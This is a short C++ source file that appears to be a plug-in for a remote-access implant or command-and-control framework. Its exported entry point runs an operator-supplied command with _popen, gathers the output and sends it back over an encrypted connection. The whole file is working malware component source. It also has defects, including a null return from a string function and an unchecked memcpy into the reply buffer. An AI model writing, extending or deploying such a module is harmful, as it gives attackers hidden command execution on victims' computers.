#include <Windows.h>
#include <iostream>
#include <filesystem>
#include <structs.h>

std::string command_execute(const char* cmd) {
    char line[256];
    std::string buffer;
    FILE* pPipe;
    if ((pPipe = _popen(cmd, "r")) == NULL)
    {
        return 0;
    }
    while (fgets(line, 256, pPipe))
    {
        buffer += line;
    }
    return buffer;
}

extern "C" __declspec(dllexport) ULONG ModuleEntrypoint(MODULE_CONTEXT ctx) {
	OUTPUT response = { 0 };
	std::string _stdout = command_execute(ctx.argv.at(0).c_str());
    response.output_length = _stdout.length();
	memcpy(response.output, _stdout.data(), _stdout.length());
	ctx.send_encrypted(ctx.aes_key, ctx.iv_key, ctx.connection, (char*)&response, sizeof(response));
	return 0;
}